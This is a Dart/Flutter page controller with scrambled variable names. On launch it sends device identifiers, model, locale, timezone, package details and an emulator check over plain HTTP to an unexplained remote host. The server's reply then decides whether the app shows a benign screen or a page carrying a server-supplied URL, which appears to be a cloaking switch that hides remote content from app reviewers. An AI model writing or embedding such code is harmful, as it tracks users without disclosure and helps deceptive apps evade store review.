import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var peirwfqd = RxBool(false);
  var qelodunwyv = RxBool(true);
  var hsemai = RxString("");
  var justyn = RxBool(false);
  var mcdermott = RxBool(true);
  final hmaiskn = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zvaqx();
  }


  Future<void> zvaqx() async {

    justyn.value = true;
    mcdermott.value = true;
    qelodunwyv.value = false;

    hmaiskn.post("http://p-as.redbok.xyz/EiWpB",data: await zkogliraw()).then((value) {
      var goflekby = value.data["goflekby"] as String;
      var jmedi = value.data["jmedi"] as bool;
      if (jmedi) {
        hsemai.value = goflekby;
        wyman();
      } else {
        klocko();
      }
    }).catchError((e) {
      qelodunwyv.value = true;
      mcdermott.value = true;
      justyn.value = false;
    });
  }

  Future<Map<String, dynamic>> zkogliraw() async {
    final DeviceInfoPlugin zrju = DeviceInfoPlugin();
    PackageInfo rndvhqk_ouat = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jbryvl = Platform.localeName;
    var SnNGOeT = currentTimeZone;

    var SrzPUZ = rndvhqk_ouat.packageName;
    var rMpW = rndvhqk_ouat.version;
    var HYpb = rndvhqk_ouat.buildNumber;

    var zogAbcNw = rndvhqk_ouat.appName;
    var pTcukZM = "";
    var fGCO  = "";
    var nsQfviU = "";
    var kiaraBogisich = "";
    var berneiceKoch = "";
    var edisonBlock = "";
    var kirstinRowe = "";
    var lornaBeatty = "";

    var darleneSmitham = "";

    var wuvGzcpK = "";
    var tLMGH = false;

    if (GetPlatform.isAndroid) {
      wuvGzcpK = "android";
      var vchlzd = await zrju.androidInfo;

      nsQfviU = vchlzd.brand;

      pTcukZM  = vchlzd.model;
      fGCO = vchlzd.id;

      tLMGH = vchlzd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wuvGzcpK = "ios";
      var mqvdfkcwo = await zrju.iosInfo;
      nsQfviU = mqvdfkcwo.name;
      pTcukZM = mqvdfkcwo.model;

      fGCO = mqvdfkcwo.identifierForVendor ?? "";
      tLMGH  = mqvdfkcwo.isPhysicalDevice;
    }

    var res = {
      "rMpW": rMpW,
      "pTcukZM": pTcukZM,
      "darleneSmitham" : darleneSmitham,
      "SnNGOeT": SnNGOeT,
      "nsQfviU": nsQfviU,
      "kirstinRowe" : kirstinRowe,
      "berneiceKoch" : berneiceKoch,
      "HYpb": HYpb,
      "fGCO": fGCO,
      "jbryvl": jbryvl,
      "wuvGzcpK": wuvGzcpK,
      "tLMGH": tLMGH,
      "SrzPUZ": SrzPUZ,
      "zogAbcNw": zogAbcNw,
      "edisonBlock" : edisonBlock,
      "lornaBeatty" : lornaBeatty,
      "kiaraBogisich" : kiaraBogisich,

    };
    return res;
  }

  Future<void> klocko() async {
    Get.offAllNamed("/widgetMain");
  }

  Future<void> wyman() async {
    Get.offAllNamed("/yoga");
  }

}
